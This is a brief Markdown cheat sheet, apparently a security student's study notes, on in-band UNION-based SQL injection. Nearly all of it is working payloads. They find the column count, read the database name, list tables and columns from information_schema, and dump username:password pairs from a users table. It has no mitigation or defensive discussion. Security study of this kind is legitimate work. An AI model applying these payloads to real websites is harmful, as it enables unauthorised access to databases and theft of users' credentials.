- - -
## In-Band SQLi : 

```mysql
UNION SELECT 1
UNION SELECT 1,2
UNION SELECT 1,2,3
```

Now, We got Success, If the <mark style="background: #ABF7F7A6;">error message has gone</mark>. --> 200 OK !!

**<u>Get Database Name</u>** : 
```mysql
UNION SELECT 1,2,database()
```

**<u>Get Table Names</u>** :
```mysql
UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database-name'
```

**<u>Get Columns Names</u>** : 
```mysql
UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'
```

**<u>Dumping selected coloum</u>** : 
```mysql
UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users
```

